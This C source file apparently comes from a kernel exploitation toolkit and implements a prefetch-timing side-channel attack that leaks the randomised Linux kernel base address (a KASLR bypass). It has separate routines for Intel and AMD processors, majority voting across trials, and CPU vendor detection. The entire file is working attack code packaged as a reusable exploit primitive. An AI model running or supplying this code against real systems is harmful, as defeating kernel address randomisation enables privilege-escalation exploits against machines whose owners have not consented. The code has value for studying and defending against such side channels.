#include <kpwn/logger.h>
#include <kpwn/utils.h>
#include <kpwn/x86_64/side_channel.h>
#include <stdint.h>
#include <string.h>

#define MAX_TRIALS 16

size_t kasld_amd() {
  return kasld_amd_with_conf(0xffffffff81000000ull,  // start
                             0xffffffffc0000000ull,  // end
                             0x0000000000080000ull,  // step
                             7,                      // num_confirm
                             11                      // window_size
  );
}

size_t kasld_amd_with_conf(size_t start, size_t end, size_t step, size_t num_confirm, size_t window_size) {
  ASSERT_MSG(start < end, "Start address must be less than end address");
  ASSERT_MSG((end - start) % step == 0, "Range must be divisible by step size");

  size_t num_steps = (end - start) / step;

  REP(MAX_TRIALS) {
    uint64_t found_bases[num_confirm];

    REP(try, num_confirm) {
      size_t checking_address[num_steps];
      size_t times[num_steps];

      REP(i, num_steps) {
        checking_address[i] = start + step * i;
        times[i] = SIZE_MAX;
      }

      REP(16) {
        REP(i, num_steps) {
          times[i] = MIN(times[i], measure_prefetch((void*)checking_address[i]));
        }
      }

      uint64_t max_value = 0;
      uint64_t max_index = 0;
      REP(base_idx, num_steps - window_size) {
        size_t sum = 0;
        REP(i, window_size) {
          sum += times[base_idx + i];
        }

        if (sum > max_value) {
          max_value = sum;
          max_index = base_idx;
        }
      }

      found_bases[try] = checking_address[max_index];
    }

    struct count_sort_data majority = count_sort(found_bases, num_confirm);

    if (majority.counter > num_confirm / 2) {
      log_success("[side channel] found kbase at %#lx", majority.data);
      return majority.data;
    }
  }

  log_error("could not get majority voting...");
  return 0;
}

size_t kasld_intel() {
  return kasld_intel_with_conf(0xffffffff81000000ull, 0xffffffffd0000000ull, 0x0000000000400000ull, 7);
}

size_t kasld_intel_with_conf(size_t start, size_t end, size_t step, size_t num_confirm) {
  ASSERT_MSG(start < end, "Start address must be less than end address");
  ASSERT_MSG((end - start) % step == 0, "Range must be divisible by step size");

  size_t num_steps = (end - start) / step;

  REP(MAX_TRIALS) {
    uint64_t found_bases[num_confirm];

    REP(try, num_confirm) {
      size_t checking_address[num_steps];
      size_t times[num_steps];

      REP(i, num_steps) {
        checking_address[i] = start + step * i;
        times[i] = SIZE_MAX;
      }

      REP(16) {
        REP(i, num_steps) {
          times[i] = MIN(times[i], measure_prefetch((void*)checking_address[i]));
        }
      }

      uint64_t min_value = UINT64_MAX;
      uint64_t min_index = 0;
      REP(i, num_steps) {
        if (times[i] < min_value) {
          min_value = times[i];
          min_index = i;
        }
      }

      found_bases[try] = checking_address[min_index];
    }

    struct count_sort_data majority = count_sort(found_bases, num_confirm);

    if (majority.counter > num_confirm / 2) {
      log_success("[side channel] found kbase at %#lx", majority.data);

      if (0xffffff & majority.data) {
        log_warn("unaligned kernel base detected. kbase might be %#lx", majority.data & ~0xfffffful);
      }
      return majority.data;
    }
  }

  log_error("could not get majority voting...");
  return 0;
}

size_t kasld() {
  switch (get_arch()) {
    case x86_64_intel:
      return kasld_intel();
    case x86_64_amd:
      return kasld_amd();
    default:
      log_error("Unsupported architecture for kasld");
      return 0;
  }
}

enum side_channel_arch get_arch() {
  char info[0x10];
  cpuinfo_str(info);

  log_debug("[side channel] cpu architecture as %s", info);

  if (strcmp(info, "GenuineIntel") == 0) {
    return x86_64_intel;
  } else if (strcmp(info, "AuthenticAMD") == 0) {
    return x86_64_amd;
  } else {
    log_warn("Unknown CPU architecture: %s", info);
    return unknown_arch;
  }
}
